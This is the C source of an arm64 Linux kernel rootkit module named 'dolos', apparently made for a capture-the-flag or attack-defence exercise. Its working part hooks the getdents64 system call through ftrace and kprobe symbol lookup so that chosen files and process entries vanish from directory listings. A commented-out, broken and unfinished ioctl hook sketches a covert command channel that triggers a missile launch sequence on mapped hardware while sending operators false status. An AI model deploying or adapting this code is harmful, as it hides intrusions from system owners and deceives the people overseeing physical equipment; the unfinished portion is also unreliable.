#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <asm/cacheflush.h>
#include <linux/module.h>
#include <linux/fprobe.h>
#include <linux/errno.h>
#include <linux/ftrace.h>
#include <linux/delay.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

#ifndef DEBUG
#define DEBUG 1
#endif
/* A simple debug print macro that will be compiled out if not defined */
  /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
#define debug_print(fmt, args...)\
    do { if (DEBUG) pr_warn(fmt, ##args); } while(0)
    
#define MAX_NAME 256


//typedef asmlinkage long (*orig_ioctl_t)(const struct pt_regs *);
typedef asmlinkage int (*orig_getdents64_t)(const struct pt_regs *);

//orig_ioctl_t orig_ioctl;
orig_getdents64_t orig_getdents64;

bool gotime = false;
bool launch = false;
//char pid[MAX_NAME];
//char lpid[MAX_NAME];
//char filename[MAX_NAME];
//bool rfilename = false;
//bool rpid = false;

// Test
char pid[] = "/proc/1";
char lpid[] = "1";
char filename[] = "hideme.txt";
bool rfilename = true;
bool rpid = true;


//RegisterMap *reg_map1;
//RegisterMap *rm;

/*struct Registers {

	unsigned int status;
	unsigned int reserved0;
	unsigned int command;
	unsigned int reserved1;
	unsigned int data;
	unsigned int reserved2;
};*/

/*struct RegisterMap {
	Registers * hatch;
	Registers * bd;
	Registers * wl;
	Registers * rl;
	Registers * mr;
	Registers * tc;
	Registers * lc;
	uint8_t * tcbuf;
	uint8_t * lcbuf;
};*/

struct ftrace_hook {
    const char *name;
    void * function;
    void * original;
    struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original)   \
    {                                       \
        .name = (_name),                    \
        .function = (_function),             \
        .original = (_original),             \
    }

int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret);

// Generic handler for any function we want to hook
// Simple check to prevent getting in a loop
// Check if we are calling from our own module, don't do hook
// Otherwise set ip to our own private counter
static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
/* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook * fhook = op->private; // data we can pass in
    /* Since we will call the original function again we need to make sure we don't end up in a loop
     * Check to see if our module is the caller of the original. If yes, don't change PC
     */
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->pc = (unsigned long) fhook->function;
    }
}

/* Hook to hide directories/files */
static asmlinkage int dolos_getdents64(struct pt_regs *regs) {
    int check;
    // We want the output of the original getdents64
    int orig_ret = orig_getdents64(regs);
    
    // Return original if error or we do not have the pid or filename yet
    if (orig_ret <= 0 || (!rpid && !rfilename)) { // Error -> errno already set
    	return orig_ret;
    }
    
    struct linux_dirent64 *ker_dirent;
    ker_dirent = (struct linux_dirent64 *)kzalloc(orig_ret, GFP_KERNEL); // zero out mem for ker_dirent  

    check = copy_from_user(ker_dirent, regs->regs[1], orig_ret); // Copy buffer into kernel mem
    unsigned int count = 0;
    count = regs->regs[2];
    
    if (ker_dirent->d_reclen == 0) {
    	kfree(ker_dirent);
    	return orig_ret;
    }

    int bytes_to_return = malicious_getdents64(ker_dirent, &count, orig_ret);

    // If we changed anything, ensure we copy out our data
    if (bytes_to_return != orig_ret) {
        memset(regs->regs[1], 0, orig_ret); // Zero out buffer in userspace
        check = copy_to_user(regs->regs[1], ker_dirent, bytes_to_return); // Copy buffer to userspace
        regs->regs[2] = count; // Update the correct count
    }

    kfree(ker_dirent); // Free kernel mem
    return bytes_to_return;
}

int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret)
{
    int bytes_to_return = orig_ret;
    unsigned long offset = 0;

    char* ptr = (char*)ker_dirent; // Our current pointer in the buffer
    bool hideFlag = false;
    struct linux_dirent64 *curr = NULL;
    struct linux_dirent64 *winner = NULL;

    // Look through dirent structure to find the directories/files we want to hide
    while(offset < orig_ret) {
        ptr = (char*)ker_dirent + offset;
        curr = (struct linux_dirent64*)ptr; // Our current pointer in the buffer

        if (curr->d_reclen == 0)  {
            return bytes_to_return;
        }

        if(rfilename && (strcmp(filename, curr->d_name)==0)) {
            hideFlag = true;
            winner = curr;
            break;
        
        } else if(rpid && ((strcmp(pid, curr->d_name)==0) || (strcmp(lpid, curr->d_name)==0))) {
            hideFlag = true;
            winner = curr;
            break;
	}
        offset += curr->d_reclen; // Go to next dirent
    }
    if(hideFlag) {
    	    char* next = (char *)curr + curr->d_reclen;
    	    bytes_to_return -= curr->d_reclen;
	    memmove(winner, next, bytes_to_return - offset); // Shift buffer down
    }
    return bytes_to_return;
}


/* Hook that prevents a real launch from occurring 
// cmd = 0x19_
// arg = 
static asmlinkage long dolos_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
{

	if (fd == -1877) { // Our creators are talking to us
		if (cmd == 8008) { // pid 
			sprintf(pid, "/proc/%d", arg);
			sprintf(lpid, "%d", arg);
			return 42;
			
		} else if (cmd == 1234) {
			__arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
			return 42;
		
		} else { // CWES ASSEMBLE
			gotime = true;
			return 42;
		}
	}
	// Real launch is occurring
	if (gotime) {
		// do malicious ioctl	
		if (cmd == 0x195) {
			launch = true;
			map_regions(); // Map our register map
			
			unsigned long *kernel_argp; //??
			__n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
			if (__n == 0) {
				return 0;
			}
			
			int timeLimit = 10;
			// Set missile startup
			while(rm->mr->status != 6 && timeLimit > 0) {
				rm->mr->data = kernel_argp;
				rm->mr->command = 4;
				timeLimit --;
				msleep(500)
			}
			if(rm->mr->status != 6) {
				//abort
			}
			
			//turn on lights and close blast door
			rm->rl->command = 1;
			msleep(2000)
			rm->bd->command = 2;
			timeLimit = 80;
			while(rm->bd->status != 2 && timeLimit > 0) {
				msleep(100);
				timeLimit --;
			}
			if(rm->bd-> status != 20) {
				//abort
			}
			
			//open hatch
			timeLimit = 80;
			rm->hatch->command = 1;
			while(rm->hatch->status != 1 && timeLimit > 0) {
				msleep(100);
				timeLimit --;
			}
			if(rm->hatch->status != 1) {
				//abort
			}
			
			rm->mr->command = 1;
			if(rm->mr->status == 3;
			// Shut hatch
			
			// Open blastdoor
			
			// 
			
			
			
			
			
			
			
			
			
		// Give the user incorrect status if orangeland has tried to launch
		} else if (launch == true) {
			unsigned long data = 0;
			if (cmd == 0x191) {
				data = 1;
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send hatch is open
			}
			else if (cmd == 0x192) {
				data = 1; 
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send blastdoor is closed
			}
			else if (cmd == 0x193) {
				data = 1;
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send wlights are on
			}
			else if (cmd == 0x194) {
				data = 1;
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send rlights are on
			}
			else if (cmd == 0x196) {
				data = 3; 
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send missile is ready
			}
			else if (cmd == 0x197) {
				data = ; 
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send tcams
			}
			else if (cmd == 0x198) {
				data = ; 
				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send lcams 
			}
			
			return 0; // No errors, send status
		
		} else {
			return orig_ioctl(file, cmd, arg); // Pass to original function
		}
		
	} else {
		
		return orig_ioctl(file, cmd, arg); // Pass to original function
	}
	return 0;
}

int mapregions() {
  unsigned long addr1;
  char cVar4;
  Registers *pRVar5;
  uint8_t *puVar6;
  unsigned long uVar7;
  
  uVar7 = 0x68000000000713;
  rm = (RegisterMap *)kmalloc(0x8000,0x48);
  buf = (uint8_t *)vmalloc(0x4000);
  reg_map1 = rm;
  addr1 = uVar7;
  if (arm64_use_ng_mappings != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080120,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->hatch = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080100,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->bd = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080200,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->wl = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080220,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->rl = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080240,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->mr = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080260,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->tc = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  pRVar5 = (Registers *)ioremap(0x60080280,0x18);
  cVar4 = arm64_use_ng_mappings;
  reg_map1->lc = pRVar5;
  reg_map1 = rm;
  addr1 = uVar7;
  if (cVar4 != '\0') {
    addr1 = 0x68000000000f13;
  }
  puVar6 = (uint8_t *)ioremap(0x60081000,0x4000);
  cVar4 = arm64_use_ng_mappings;
  pRVar3 = rm;
  reg_map1->tcbuf = puVar6;
  if (cVar4 != '\0') {
    uVar7 = 0x68000000000f13;
  }
  puVar6 = (uint8_t *)ioremap(0x60085000,0x4000);
  pRVar3->lcbuf = puVar6;
  return 0;
}*/

struct ftrace_ops ops = {
    .func = dolos_ftrace_stub,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY
};

static unsigned long lookup_name(const char *name)
{
    /* kallsyms_lookup_name was a function that used to be exported.
     * See discussion here for why is was removed https://lwn.net/Articles/813350/
     * Now we can use a kprobe to find the address of "any" symbol
     * https://docs.kernel.org/trace/kprobes.html
     */
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static int install_hook(struct ftrace_hook* hook) // install ftrace hook
{
    int ret = 0;
    /* lookup the original symbol */
    unsigned long address = lookup_name(hook->name);
    /* save it to the hook struct */
    *(unsigned long *) hook->original = address;

    debug_print("hook address at %lx\n", address);
    if (address == 0)
    {
        debug_print("Failed to find symbol %s\n", hook->name);
        ret = 1;
        return ret;
    }
    hook->ops.func = dolos_ftrace_stub;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    hook->ops.private = hook;
    ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0); // pass ops structure and address we want to hook, sometimes more than one function has the same name, pass ip for accuracy
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
        return ret;
    }
    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("register_ftrace_function %d\n", ret);
        ftrace_set_filter_ip(&hook->ops, address, 1, 0);
    }
    return ret;
}

static void remove_hook(struct ftrace_hook* hook)
{
    int ret;
    ret = unregister_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("unregister_ftrace_function failed: %d\n", ret);
    }
    ret = ftrace_set_filter_ip(&hook->ops, *((unsigned long *) hook->original), 1, 0);
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
    }
}

static int install_hooks(struct ftrace_hook *hooks, size_t count) // look through array of hooks
{
    size_t i;
    int ret = 0;

    for (i = 0; i < count; i++) {
        ret = install_hook(&hooks[i]);
        if (ret)
        {
            goto error;
        }
    }

    return 0;
error:
    while (i!=0) {
        remove_hook(&hooks[--i]);
    }
    return ret;
}

static void remove_hooks(struct ftrace_hook * hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
    {
        remove_hook(&hooks[i]);
    }
}

/* an array of functions we want to hook */
static struct ftrace_hook hooks[] = {
    HOOK("__arm64_sys_getdents64", dolos_getdents64, &orig_getdents64),
    //HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
};


static int __init dolos_init(void)
/* called on module load */
{
    int ret = 0;
    ret = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret) {
        debug_print("failed to load: %d\n", ret);
        return ret;
    }
    debug_print("Loaded\n");
    

    return 0;
}

static void __exit dolos_exit(void)
/* called on module exit */
{
    int err;
    err = 0;
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    debug_print("unloaded\n");
}

/* register our init and exit functions */
module_init(dolos_init);
module_exit(dolos_exit);

